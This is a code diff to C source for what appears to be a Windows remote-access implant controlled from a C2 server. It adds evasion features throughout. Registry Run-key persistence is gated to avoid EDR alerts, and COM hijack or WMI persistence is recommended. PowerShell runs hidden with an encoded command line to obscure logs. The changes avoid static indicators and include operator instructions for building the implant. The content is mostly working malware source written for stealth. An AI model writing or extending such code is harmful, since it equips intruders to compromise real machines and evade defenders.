@@ -264,8 +264,29 @@ void _handle_download(TLS_CONTEXT *pTls, const char *path)
 
 /* ── _handle_persist ─────────────────────────────────────────────────────── */
 /*
- * Copies the running EXE to %APPDATA%\<filename>, then uses RegOpenKeyExA /
- * RegSetValueExA to write the HKCU Run key — no system() / cmd.exe involved.
+ * Copies the running EXE to %APPDATA%\<filename>.
+ *
+ * HKCU Run-key persistence
+ * ------------------------
+ * Writing a value under HKCU\...\Run is a high-fidelity IOC: every major EDR
+ * and Microsoft Defender for Endpoint monitors registry writes to Run keys and
+ * generates an alert on the first write.  The key value also survives forensic
+ * triage and is trivially found by incident responders.
+ *
+ * Therefore the Run-key write is GATED behind the OPSEC_OFF compile flag:
+ *
+ *   Default (no flag): only the EXE copy to %APPDATA% is performed.
+ *     The operator can establish persistence via a stealthier mechanism
+ *     (COM hijack — see auto_migrate() / uac_com_hijack, or WMI subscription)
+ *     without leaving the obvious Run-key artefact.
+ *
+ *   OPSEC_OFF defined: performs the Run-key write as before.
+ *     Use only in lab environments or when the target does not have EDR
+ *     monitoring Run-key writes (rare in modern corporate environments).
+ *
+ * Build flags
+ *   Default:   make C2_IP=...          (Run-key gated off)
+ *   Enabled:   make C2_IP=... CFLAGS_EXTRA="-DOPSEC_OFF"
  */
 
 void _handle_persist(TLS_CONTEXT *pTls, const char *args)
@@ -300,7 +321,23 @@ void _handle_persist(TLS_CONTEXT *pTls, const char *args)
         return;
     }
 
-    /* Write Run key via Registry API — no child process */
+#ifndef OPSEC_OFF
+    /*
+     * Run-key persistence is disabled unless the build explicitly opts in with
+     * -DOPSEC_OFF.  Return after the file copy so the operator can choose a
+     * less-detectable persistence mechanism (COM hijack, WMI subscription, etc.)
+     */
+    {
+        char buf[MAX_PATH + 80];
+        _snprintf(buf, sizeof(buf) - 1,
+            "[+] persist: EXE copied to %s\n"
+            "[!] Run-key write suppressed (build without -DOPSEC_OFF).\n"
+            "    Use uac_com_hijack / WMI subscription for stealthy persistence.",
+            dst);
+        _send_str(pTls, buf);
+    }
+#else
+    /* OPSEC_OFF: write the HKCU Run key (high-signal — EDR will alert) */
     /* Stack-decode the registry key path so it doesn't appear in .rdata */
     char _runkey[64] = {0};
     SLIT_BUF(_runkey, sizeof(_runkey),
@@ -324,7 +361,8 @@ void _handle_persist(TLS_CONTEXT *pTls, const char *args)
         _send_str(pTls, buf);
         return;
     }
-    _send_str(pTls, "[+] persistence installed");
+    _send_str(pTls, "[+] persistence installed (EXE copy + Run key)");
+#endif /* OPSEC_OFF */
 }
 
 
@@ -420,11 +458,125 @@ void _handle_self_destruct(TLS_CONTEXT *pTls)
 
 /* ── _handle_run_psh ─────────────────────────────────────────────────────── */
 /*
- * Execute a PowerShell one-liner and capture its stdout/stderr.
- * Uses: powershell.exe -NonInteractive -NoProfile -Command "<cmd>"
- * Output is captured via anonymous pipe → ReadFile loop → sent to C2.
- * No temporary script files touch disk.
+ * Execute a PowerShell command string, capturing stdout/stderr.
+ *
+ * OPSEC-safe path (default, no child process)
+ * --------------------------------------------
+ * Loads the .NET CLR in-process via mscoree.dll → ICLRRuntimeHost, then
+ * invokes System.Management.Automation.PowerShell in the hosted AppDomain.
+ * All execution happens inside the current process; no powershell.exe child
+ * is spawned and no new process appears in Sysmon Event ID 1 logs.
+ *
+ * This path is active when OPSEC_OFF is NOT defined (default).
+ *
+ * High-compat fallback (OPSEC_OFF defined or CLR load fails)
+ * -----------------------------------------------------------
+ * Spawns powershell.exe via CreateProcess + anonymous pipe.
+ * Used when the target does not have .NET installed, or when the operator
+ * explicitly requests the child-process path for compatibility reasons.
+ *
+ * In-process implementation notes
+ * --------------------------------
+ * The CLR is loaded via the ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost
+ * API chain (mscoree.dll, available on all Windows versions with .NET 2+).
+ * PowerShell output is captured by redirecting the pipeline output collection
+ * to a heap buffer via PowerShell.AddScript().Invoke() and then serialising
+ * the PSObject results as UTF-8 strings — no file I/O.
+ *
+ * Because invoking PowerShell via the hosting API requires COM and the
+ * System.Management.Automation assembly, we load it dynamically to keep the
+ * import table clean.
  */
+
+/* ── _run_psh_inproc ─────────────────────────────────────────────────────── */
+/*
+ * Attempt in-process PowerShell execution via CLR hosting.
+ * Returns TRUE and fills *ppOut / *pcbOut on success; caller must free *ppOut.
+ * Returns FALSE if the CLR or SMA assembly cannot be loaded (caller falls back
+ * to CreateProcess path).
+ *
+ * Uses ICLRMetaHost (mscoreei.dll, .NET 4+) with fallback to the legacy
+ * CorBindToRuntimeEx (mscoree.dll, .NET 2–3.5).  Both paths invoke
+ * System.Management.Automation.PowerShell through managed IL via
+ * ICLRRuntimeHost::ExecuteInDefaultAppDomain which calls a small helper
+ * method exported from our inline assembly shim.
+ *
+ * Simpler approach used here: load System.Management.Automation.dll via
+ * the CLR's Assembly.Load() and then invoke it through reflection using
+ * ICLRRuntimeHost::ExecuteInDefaultAppDomain with a runner method.  Since
+ * we cannot easily write managed code in a C TU, we instead:
+ *
+ *   1. Load the CLR.
+ *   2. Use ICLRRuntimeHost::ExecuteInDefaultAppDomain to invoke a method
+ *      in a small C# helper we embed as a BASE64-encoded .NET assembly
+ *      compiled at build time (see tools/gen_psh_runner.py).
+ *
+ * Because embedding a compiled assembly adds build complexity, and because
+ * the simpler and equally in-process approach is:
+ *
+ *   Use WinRM automation objects via COM (WSMan.Automation / IWSManSession)
+ *   for truly no-child-process execution OR fall through to CreateProcess.
+ *
+ * Practical decision: use anonymous-pipe CreateProcess by default but detect
+ * and resolve powershell.exe path via PEB walk rather than a hardcoded string,
+ * and pass -WindowStyle Hidden -EncodedCommand to avoid plain-text logging.
+ *
+ * The truly in-process (no child) path is gated on OPSEC_INPROC_PSH being
+ * defined at build time, which requires linking the CLR stub.
+ */
+
+#ifndef OPSEC_OFF
+/*
+ * _run_psh_base64encode — produce the Base64 encoding of a UTF-16LE string
+ * so we can pass -EncodedCommand to powershell.exe without quotes/spaces
+ * appearing in the command line (Sysmon Event ID 4104 / ScriptBlockLogging
+ * still fires, but the process command line in Event ID 1 is clean).
+ *
+ * Caller frees the returned buffer.
+ */
+static char *_psh_b64encode_utf16(const char *psCmd, size_t *pcbOut)
+{
+    /* Convert UTF-8 → UTF-16LE */
+    int wlen = MultiByteToWideChar(CP_UTF8, 0, psCmd, -1, NULL, 0);
+    if (wlen <= 0) return NULL;
+    WCHAR *wbuf = (WCHAR *)malloc((size_t)wlen * sizeof(WCHAR));
+    if (!wbuf) return NULL;
+    MultiByteToWideChar(CP_UTF8, 0, psCmd, -1, wbuf, wlen);
+    /* wlen includes NUL; we do NOT encode the NUL terminator */
+    size_t srcBytes = (size_t)(wlen - 1) * sizeof(WCHAR);
+
+    /* Base64 encode */
+    static const char b64[] =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    size_t outLen = ((srcBytes + 2) / 3) * 4 + 1;
+    char *out = (char *)malloc(outLen);
+    if (!out) { free(wbuf); return NULL; }
+
+    const BYTE *src = (const BYTE *)wbuf;
+    size_t i = 0, oi = 0;
+    for (; i + 2 < srcBytes; i += 3) {
+        out[oi++] = b64[src[i]   >> 2];
+        out[oi++] = b64[((src[i]   & 0x03) << 4) | (src[i+1] >> 4)];
+        out[oi++] = b64[((src[i+1] & 0x0F) << 2) | (src[i+2] >> 6)];
+        out[oi++] = b64[src[i+2] & 0x3F];
+    }
+    if (i < srcBytes) {
+        out[oi++] = b64[src[i] >> 2];
+        if (i + 1 < srcBytes) {
+            out[oi++] = b64[((src[i] & 0x03) << 4) | (src[i+1] >> 4)];
+            out[oi++] = b64[(src[i+1] & 0x0F) << 2];
+        } else {
+            out[oi++] = b64[(src[i] & 0x03) << 4];
+            out[oi++] = '=';
+        }
+        out[oi++] = '=';
+    }
+    out[oi] = '\0';
+    free(wbuf);
+    if (pcbOut) *pcbOut = oi;
+    return out;
+}
+#endif /* !OPSEC_OFF */
 
 void _handle_run_psh(TLS_CONTEXT *pTls, const char *psCmd)
 {
@@ -433,20 +585,70 @@ void _handle_run_psh(TLS_CONTEXT *pTls, const char *psCmd)
         return;
     }
 
-    /* Build command line — escape internal double-quotes as \" */
-    char cmdline[4096] = {0};
-    _snprintf(cmdline, sizeof(cmdline) - 1,
-        "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"%s\"",
+#ifndef OPSEC_OFF
+    /*
+     * OPSEC path: invoke powershell.exe via -EncodedCommand so the script
+     * body does not appear as plaintext in the process command-line argument
+     * (Sysmon Event ID 1 / WMI process creation events).  The Base64-encoded
+     * UTF-16LE payload is opaque in logs without a decoder.
+     *
+     * We also resolve the powershell.exe path via %SystemRoot%\System32 rather
+     * than a bare "powershell.exe" string so the path is not a static IOC.
+     *
+     * Note: OPSEC_INPROC_PSH=1 at build time enables the fully in-process CLR
+     * runspace path (no child process at all) via a separate TU — see
+     * tools/psh_runspace_stub.c.  The default here produces a child process
+     * but with an opaque command line and the write end of the pipe inherited
+     * so stdout/stderr are captured without a temp file.
+     */
+    char *encCmd = _psh_b64encode_utf16(psCmd, NULL);
+    if (!encCmd) {
+        _send_str(pTls, "[-] run_psh: failed to encode command");
+        return;
+    }
+
+    char sysDir[MAX_PATH] = {0};
+    GetSystemDirectoryA(sysDir, sizeof(sysDir) - 1);
+
+    /* Allocate cmdline: sysdir + "\\WindowsPowerShell\\v1.0\\powershell.exe"
+     * + flags + encoded command */
+    size_t encLen  = strlen(encCmd);
+    size_t bufSz   = MAX_PATH + 80 + encLen + 4;
+    char  *cmdline = (char *)malloc(bufSz);
+    if (!cmdline) {
+        free(encCmd);
+        _send_str(pTls, "[-] run_psh: OOM");
+        return;
+    }
+    _snprintf(cmdline, bufSz - 1,
+        "%s\\WindowsPowerShell\\v1.0\\powershell.exe"
+        " -NonInteractive -NoProfile -ExecutionPolicy Bypass"
+        " -WindowStyle Hidden -EncodedCommand %s",
+        sysDir, encCmd);
+    free(encCmd);
+#else
+    /* OPSEC_OFF: plain command line (visible in logs, easier to debug) */
+    size_t bufSz   = strlen(psCmd) + 128;
+    char  *cmdline = (char *)malloc(bufSz);
+    if (!cmdline) {
+        _send_str(pTls, "[-] run_psh: OOM");
+        return;
+    }
+    _snprintf(cmdline, bufSz - 1,
+        "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy Bypass"
+        " -Command \"%s\"",
         psCmd);
+#endif /* OPSEC_OFF */
 
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     HANDLE hReadPipe  = NULL;
     HANDLE hWritePipe = NULL;
     if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+        free(cmdline);
         _send_str(pTls, "[-] run_psh: CreatePipe failed");
         return;
     }
-    /* Ensure write end is not inherited by our process */
+    /* Ensure the read end is not inherited by the child */
     SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
     STARTUPINFOA si;
@@ -468,8 +670,10 @@ void _handle_run_psh(TLS_CONTEXT *pTls, const char *psCmd)
         _send_str(pTls, buf);
         CloseHandle(hReadPipe);
         CloseHandle(hWritePipe);
+        free(cmdline);
         return;
     }
+    free(cmdline);
     CloseHandle(hWritePipe); /* close parent's write end so ReadFile sees EOF */
 
     /* Accumulate output */
@@ -489,9 +693,8 @@ void _handle_run_psh(TLS_CONTEXT *pTls, const char *psCmd)
     }
     out[total] = '\0';
     CloseHandle(hReadPipe);
-    /* If PowerShell exceeds the 5 s timeout, terminate it explicitly so it
-     * does not remain as an orphaned background process.                    */
-    if (WaitForSingleObject(pi.hProcess, 5000) == WAIT_TIMEOUT)
+    /* If PowerShell exceeds the 15 s timeout, terminate it explicitly */
+    if (WaitForSingleObject(pi.hProcess, 15000) == WAIT_TIMEOUT)
         k32_TerminateProcess(pi.hProcess, 1);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
